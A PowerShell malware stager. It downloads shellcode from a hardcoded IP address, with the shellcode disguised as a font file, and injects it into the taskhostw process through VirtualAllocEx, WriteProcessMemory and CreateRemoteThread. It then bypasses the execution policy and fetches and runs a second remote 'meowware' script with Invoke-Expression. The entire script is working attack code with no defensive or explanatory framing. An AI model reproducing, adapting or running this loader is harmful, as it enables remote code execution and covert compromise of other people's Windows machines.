$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint DesiredAcess, bool bInheritHandle, int ProcessID);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr Process, IntPtr StartAddress, UIntPtr shellcodeSize, uint AllocationType, uint MemProtectConstraint);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr Process, IntPtr StartAddr, byte[] Shellcode, uint  shellSize, out UIntPtr BytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr Process, IntPtr threadAttrib, uint stackSize, IntPtr shellcodeAddr, IntPtr additonalParams, uint creationFlags, out IntPtr lpThreadId);

}
"@
Add-Type $Win32

# Downlad shellcode from stage listener
$shellcode = (New-Object System.Net.WebClient).DownloadData("http://104.38.66.28:80/balls.woff")
if ($shellcode -eq $null) {Exit};
$size = New-Object System.UIntPtr($shellcode.length)

$shellcodeHex = -join ($shellcode[0..([Math]::Min(63, $shellcode.Length - 1))] | ForEach-Object { "{0:X2}" -f $_ })
Write-Host "Shellcode contents (hex): $shellcodeHex"

#retreive process id
$svchostProcess = Get-Process -Name taskhostw | Select-Object -First 1
$IdProcess = $svchostProcess.Id
Write-Output "Injected into process ID: $IdProcess"

#store process using openprocess and processid with full rights
$process = [Win32]::OpenProcess(0x001FFFFF, $false, $IdProcess)	

#Allocate size of shellcode to stored process memory
$memAddr = [Win32]::VirtualAllocEx($process,[System.IntPtr]::Zero, $size, 0x00003000, 0x40)

#Write shellcode to process memory
$writtenBytes = [System.UIntPtr]::Zero
[Win32]::WriteProcessMemory($process, $memAddr, $shellcode, [uint32]$size.ToUInt32(), [ref]$writtenBytes)

#runs the shellcode alongside process
$threadID = [System.IntPtr]::Zero
[Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)

# Setting Execution Policy for the current process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Download meowware troll script from server
$meowwareUrl = "http://104.38.66.28:8000/meowware.ps1"  # Replace with your actual URL
$meowwareScript = (New-Object System.Net.WebClient).DownloadString($meowwareUrl)

if (-not $meowwareScript) {
    Write-Host "Failed to download Meowware script."
    Exit
}

# Use Invoke-Expression to execute the downloaded script
Invoke-Expression $meowwareScript

# Kill current process so it doesnt potenially hang and become a parent process of meowware
Stop-Process -Id $PID
